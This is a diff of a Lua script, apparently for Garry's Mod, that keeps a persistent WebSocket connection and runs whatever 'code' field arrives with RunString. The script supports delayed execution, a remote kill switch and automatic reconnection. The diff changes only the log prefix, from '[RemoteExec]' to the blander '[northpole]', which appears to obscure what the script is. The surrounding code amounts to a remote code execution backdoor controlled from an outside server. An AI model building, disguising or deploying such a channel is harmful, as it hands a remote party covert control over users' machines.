@@ -1,6 +1,6 @@
 -- Kill any existing connection to avoid duplicates
 if _G.RemoteExecWS then
-    print("[RemoteExec] Closing previous WebSocket connection...")
+    print("[northpole] Closing previous WebSocket connection...")
     _G.RemoteExecDisabled = true
 
     -- Safe close if function exists
@@ -16,7 +16,7 @@ _G.RemoteExecDisabled = false
 -- Load gwsockets binary
 local ok, err = pcall(require, "gwsockets")
 if not ok then
-    ErrorNoHalt("[RemoteExec] Failed to load gwsockets: " .. tostring(err) .. "\n")
+    ErrorNoHalt("[northpole] Failed to load gwsockets: " .. tostring(err) .. "\n")
     return
 end
 
@@ -31,7 +31,7 @@ function ws:onMessage(msg)
     if not istable(data) then return end
 
     if data.kill then
-        print("[RemoteExec] Kill signal received. Shutting down.")
+        print("[northpole] Kill signal received. Shutting down.")
         _G.RemoteExecDisabled = true
         self:close()
         _G.RemoteExecWS = nil
@@ -45,7 +45,7 @@ function ws:onMessage(msg)
     local delay = (data.run_at or os.time()) - os.time()
     if delay < 0 then delay = 0 end
 
-    print("[RemoteExec] Executing code in " .. delay .. " seconds")
+    print("[northpole] Executing code in " .. delay .. " seconds")
     timer.Simple(delay, function()
         if not _G.RemoteExecDisabled then
             RunString(data.code, "RemoteExec_WS")
@@ -54,7 +54,7 @@ function ws:onMessage(msg)
 end
 
 function ws:onConnected()
-    print("[RemoteExec] WebSocket connected")
+    print("[northpole] WebSocket connected")
 
     timer.Simple(1, function()
         local ply = LocalPlayer()
@@ -73,11 +73,11 @@ end
 
 function ws:onDisconnected()
     if _G.RemoteExecDisabled then
-        print("[RemoteExec] Disconnected and disabled — not reconnecting.")
+        print("[northpole] Disconnected and disabled — not reconnecting.")
         return
     end
 
-    print("[RemoteExec] Disconnected — reconnecting in 5 seconds...")
+    print("[northpole] Disconnected — reconnecting in 5 seconds...")
     timer.Simple(5, function()
         if not _G.RemoteExecDisabled then
             self:open()
